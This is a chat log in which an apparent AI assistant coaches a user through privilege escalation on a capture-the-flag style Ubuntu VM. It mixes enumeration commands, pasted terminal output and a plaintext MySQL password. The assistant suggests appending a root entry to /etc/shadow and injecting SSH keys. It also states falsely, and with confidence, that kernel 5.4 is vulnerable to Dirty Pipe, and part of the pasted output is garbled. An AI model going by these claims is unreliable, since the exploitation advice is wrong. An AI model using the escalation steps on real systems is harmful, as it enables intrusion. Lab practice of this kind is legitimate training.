🔍 Critical Blind Spots \& High-Value Targets

1\. Linux Capabilities (Not SUID)

You checked SUID binaries but missed Linux capabilities. On modern Ubuntu, many common tools are shipped with elevated capabilities instead of SUID bits. This is a frequent CTF/pentest escalation path.



Command: getcap -r / 2>/dev/null or find / -type f -perm -1000 -exec getcap {} \\; 2>/dev/null

Targets to watch for: /usr/bin/python3, /usr/bin/curl, /usr/bin/nmap, /usr/bin/vim, /bin/systemctl. Any of these with cap\_setuid+ep or cap\_dac\_override+ep can escalate to root.

2\. Kernel Exploit: CVE-2022-0847 (Dirty Pipe)

Your kernel is 5.4.0-74-generic. This falls squarely in the affected range (>=5.4) for Dirty Pipe. Ubuntu 20.04 ESM patches this, but if the box hasn't been updated since \~Oct 2021 (when -74 was released), it's highly vulnerable.



Impact: Local arbitrary read/write via pipe() + splice(). Can overwrite /etc/shadow, modify SUID binaries, or inject SSH keys for root.

Verification: grep "5.4" /proc/version + check release date of linux-image-5.4.0-74-generic. If unpatched, this is your #1 candidate.

Warning: Exploits may cause kernel panics or reboot the VM. Test in a snapshot if possible.

3\. Systemd Services \& Timers

You checked cron but missed systemd services/timers. Ubuntu heavily favors systemd for scheduled tasks. A poorly secured custom service running as root is a direct escalation path.



Check:

systemctl list-units --type=service --state=running

Look in /etc/systemd/system/, /usr/lib/systemd/system/, and \~/.config/systemd/user/ for .service or .timer files you can write to.

Check script paths referenced in ExecStart= directives for world/group-writable executables.

4\. Django Admin Fallback

The SQLi dumped application-level users, but Django may still use a /admin/ panel with the same credentials. If webmaster or linuxmaster are superusers in the Django ORM:



Visit /mercury/admin/ (or similar). If accessible, navigate to Django Admin Console or django-admin-tools (if installed) to get a shell.

Even if not superusers, checking AUTH\_USER\_MODEL permissions might reveal file upload or management command abuse paths.

5\. Environment \& Configuration Leaks

Check /proc/\*/environ for DB passwords, API keys, or AWS creds: grep -rl "password\\|SECRET\_KEY\\|AWS" /home/ /var/www/ /tmp/ 2>/dev/null

If Django's settings.py is readable (sometimes symlinked in /usr/share/django/ or via path traversal in the WSGI config), it may reveal debug mode, admin credentials, or internal endpoints.

⚠️ Technical Clarifications \& Misconceptions

Your Assumption	Reality / Refinement

SGID crontab allows -u escalation	Historically true (\~2005), but modern cron (systemd/cron) drops privileges or explicitly blocks -u for non-root. The SGID bit only allows editing crontabs in /var/spool/cron/crontabs/, not executing as another user. Dead end.

SQLi backend is MySQL	Your file tree shows db.sqlite3 (0 bytes) but claims Django+MySQL. This contradiction suggests either: (a) Misconfigured settings.py falling back to SQLite, or (b) MySQL isn't actually active. Verify with netstat -tlnp | grep 3306 and check Django logs. If it's SQLite, your SQLi payload may work differently (LOAD\_FILE() equivalent via fileio module).

MySQL auth\_socket blocks everything	Socket auth only applies to local connections using the system username matching the DB user. Remote TCP connections still use password/plugin auth. If you can connect via 127.0.0.1:3306 or the external IP with dumped creds, check information\_schema.user\_privileges.

No writable /etc files = Locked down	Often overlooked: /tmp, /var/tmp, and user-specific config dirs (\~/.config/, /run/user/1000/) may allow payload staging or symlink attacks if a root process reads/writes them predictably.

🛠️ Immediate Actionable Commands

Run these next as webmaster or linuxmaster:



\# 1. Capabilities \& Group Memberships

getcap -r / 2>/dev/null

groups webmaster linuxmaster



\# 2. Kernel \& Patch Check

uname -r

cat /etc/os-release | grep VERSION

dpkg -l | grep linux-image-5.4.0-74



\# 3. Systemd \& Service Scoping

systemctl list-units --type=service --state=running

ls -la /etc/systemd/system/ /lib/systemd/system/

cat /var/spool/cron/crontabs/\* 2>/dev/null



\# 4. MySQL Verification

mysql -u webmaster -p'mercuryisthesizeof0.056Earths' -h 192.168.56.113 -P 3306 -e "SELECT @@secure\_file\_priv; SHOW DATABASES;"

\# If it fails, check Django settings: grep -r "ENGINE" /home/webmaster/mercury\_proj/



\# 5. Environment \& Path Traversal Check

printenv | grep -i "pass\\|secret\\|key\\|token"

find /var/www /opt /tmp -writable -type f 2>/dev/null

📈 Recommended Escalation Path (Priority Order)

Capabilities \& Kernel CVEs → Highest yield, lowest effort. If cap\_setuid+ep exists or Dirty Pipe is unpatched, you'll have root in <5 minutes.

Systemd/Timer Abuse → Check for writable service scripts running as root. Very common in modern Ubuntu setups.

Django Admin / Settings Leak → Fallback if DB creds map to admin users or SECRET\_KEY is exposed.

MySQL Privilege Escalation → Only if remote TCP auth works and secure\_file\_priv=null. Allows UDF loading or event scheduler abuse.

SSH Key Injection → If any writable /root/.ssh/authorized\_keys exists via path traversal or tmp symlink race (unlikely but check /tmp + known root write paths).

You're in a strong position. The gap isn't reconnaissance—it's modern privilege escalation surfaces (capabilities, systemd, kernel post-2021 CVEs) and framework-specific fallbacks (Django admin, SQLite misconfigs). Run the capability/kernel checks first; they'll likely resolve the box immediately.



Let me know what getcap or dpkg -l \\| grep linux-image returns, and I'll tailor the next move.





Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86\_64)



\* Documentation: https://help.ubuntu.com

\* Management: https://landscape.canonical.com

\* Support: https://ubuntu.com/advantage



System information as of Wed 17 Jun 06:15:35 UTC 2026



System load: 0.02 Processes: 106

Usage of /: 67.3% of 4.86GB Users logged in: 1

Memory usage: 76% IPv4 address for enp0s3: 192.168.56.113

Swap usage: 0%





22 updates can be installed immediately.

0 of these updates are security updates.

To see these additional updates run: apt list --upgradable





The list of available updates is more than a week old.

To check for new updates run: sudo apt update

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings





Last login: Wed Jun 17 04:14:08 2026 from 192.168.56.114

linuxmaster@mercury:\~$ # 1. Capabilities \& Group Memberships

linuxmaster@mercury:\~$ getcap -r / 2>/dev/null

e\_file\_priv; SHOW DATABASES;"

\# If it fails, check Django settings: grep -r "ENGINE" /home/webmaster/mercury\_proj/



\# 5. Environment \& Path Traversal Check

printenv | grep -i "pass\\|secret\\|key\\|token"

find /var/www /opt /tmp -writable -type f 2>/dev/null

/usr/bin/traceroute6.iputils = cap\_net\_raw+ep

/usr/bin/ping = cap\_net\_raw+ep

/usr/bin/mtr-packet = cap\_net\_raw+ep

/usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap\_net\_bind\_service,cap\_net\_admin+ep

linuxmaster@mercury:\~$ groups webmaster linuxmaster

webmaster : webmaster

linuxmaster : linuxmaster viewsyslog

linuxmaster@mercury:\~$

linuxmaster@mercury:\~$ # 2. Kernel \& Patch Check

linuxmaster@mercury:\~$ uname -r

5.4.0-45-generic

linuxmaster@mercury:\~$ cat /etc/os-release | grep VERSION

VERSION="20.04.1 LTS (Focal Fossa)"

VERSION\_ID="20.04"

VERSION\_CODENAME=focal

linuxmaster@mercury:\~$ dpkg -l | grep linux-image-5.4.0-74

linuxmaster@mercury:\~$

linuxmaster@mercury:\~$ # 3. Systemd \& Service Scoping

linuxmaster@mercury:\~$ systemctl list-units --type=service --state=running

UNIT LOAD ACTIVE SUB >

accounts-daemon.service loaded active runnin>

atd.service loaded active runnin>

cron.service loaded active runnin>

dbus.service loaded active runnin>

djangotest.service loaded active runnin>

getty@tty1.service loaded active runnin>

multipathd.service loaded active runnin>

mysql.service loaded active runnin>

networkd-dispatcher.service loaded active runnin>

polkit.service loaded active runnin>

rsyslog.service loaded active runnin>

ssh.service loaded active runnin>

systemd-journald.service loaded active runnin>

systemd-logind.service loaded active runnin>

Cannot write to "-la /etc/systemd/system/ /lib/syst UNIT LOAD ACTIVE SUB >

accounts-daemon.service loaded active runnin>

atd.service loaded active runnin>

cron.service loaded active runnin>

dbus.service loaded active runnin>

djangotest.service loaded active runnin>

getty@tty1.service loaded active runnin>

multipathd.service loaded active runnin>

mysql.service loaded active runnin>

networkd-dispatcher.service loaded active runnin>

polkit.service loaded active runnin>

rsyslog.service loaded active runnin>

ssh.service loaded active runnin>

systemd-journald.service loaded active runnin>

systemd-logind.service loaded active runnin>

systemd-networkd.service loaded active runnin>

systemd-resolved.service loaded active runnin>

systemd-timesyncd.service loaded active runnin>

systemd-udevd.service loaded active runnin>

unattended-upgrades.service loaded active runnin>

user@1002.service loaded active runnin>



LOAD = Reflects whether the unit definition was >

ACTIVE = The high-level unit activation state, i.e>

SUB = The low-level unit activation state, valu>



20 loaded units listed.

set mark: ...skipping...

ssh.service loaded active runnin>

systemd-journald.service loaded active runnin>

systemd-logind.service loaded active runnin>

systemd-networkd.service loaded active runnin>

systemd-resolved.service loaded active runnin>

systemd-timesyncd.service loaded active runnin>

systemd-udevd.service loaded active runnin>

unattended-upgrades.service loaded active runnin>

user@1002.service loaded active runnin>



LOAD = Reflects whether the unit definition was >

ACTIVE = The high-level unit activation state, i.e>

SUB = The low-level unit activation state, valu>



20 loaded units listed.

linuxmaster@mercury:\~$ L Verification

L: command not found

linuxmaster@mercury:\~$ mysql -u webmaster -p'mercuryisthesizeof0.056Earths' -h 192.168.56.113 -P 3306 -e "SELECT @@secure\_file\_priv; SHOW DATABASES;"

mysql: \[Warning] Using a password on the command line interface can be insecure.

ERROR 2003 (HY000): Can't connect to MySQL server on '192.168.56.113' (111)

linuxmaster@mercury:\~$ # If it fails, check Django settings: grep -r "ENGINE" /home/webmaster/mercury\_proj/

linuxmaster@mercury:\~$

linuxmaster@mercury:\~$ # 5. Environment \& Path Traversal Check

linuxmaster@mercury:\~$ printenv | grep -i "pass\\|secret\\|key\\|token"

linuxmaster@mercury:\~$ find /var/www /opt /tmp -writable -type f 2>/dev/null

/tmp/crontab.My4Qzf/crontab

we have our full results. its alot, can you summarize?

edit

Thought for 24.7 seconds

























Here is the executive summary of your findings, with the critical pivots highlighted.



📊 Summary of Findings

Category	Finding	Significance

Capabilities	cap\_net\_raw only (ping/traceroute)	❌ Dead End. No privilege escalation via capabilities (e.g., nmap/python).

Kernel	5.4.0-45-generic	⚠️ CRITICAL VULNERABILITY. This kernel is vulnerable to Dirty Pipe (CVE-2022-0847). It allows arbitrary read/write to read-only files.

Systemd	Found djangotest.service	🎯 PRIMARY TARGET. Custom services are frequent escalation paths. Check scripts and permissions.

MySQL	Connection Refused on 192.168.x.x	🔧 Correction: It is likely bound to 127.0.0.1. Use -h 127.0.0.1 or just omit the host flag.

Writables	Found /tmp/crontab...	🗑️ Distraction. This is a transient lockfile for the current user's crontab session; it cleans up automatically.

🚀 Immediate Priorities

We have two very strong paths remaining:



Path 1: djangotest.service (The Logical Escalation)

Custom systemd services almost always run as root, and their referenced scripts are often poorly secured or writable by the service owner (linuxmaster).



Action:



\# 1. Locate the service file

cat /etc/systemd/system/djangotest.service

\# OR check the default lib dir if not in /etc/



\# 2. Look for the "ExecStart" path and the script it points to.

\# Check permissions on that script:

ls -la <script\_path> 



\# If you can write to it, add a command like 'echo root::0:0:root:/root:/bin/bash >> /etc/shadow' or ssh key injection.

Path 2: Dirty Pipe (The Exploit Escalation)

Since the kernel is 5.4.0-45 (which is older than your target list of -74), this machine definitely lacks the patch for Dirty Pipe. You can inject a root user directly into /etc/shadow or append your SSH key to /root/.ssh/authorized\_keys.



Action:



\# Check if a CVE-2022-0847 exploit is available in your local environment.

\# If you have one, run it to inject an sshkey or modify /etc/shadow.

🔧 Correction on MySQL

Your previous connection failed because you tried the external interface (192.168.56.113). The database is running locally. Try this instead:



mysql -u webmaster -p'mercuryisthesizeof0.056Earths' -h 127.0.0.1 -e "SELECT user();"

(This allows you to dump the MySQL table structure or check if there are mysql group members, though unlikely).



Recommendation: Run the cat /etc/systemd/system/djangotest.service command first. That is almost certainly how the designer intended for this box to be solved. Let me know what that file contains!

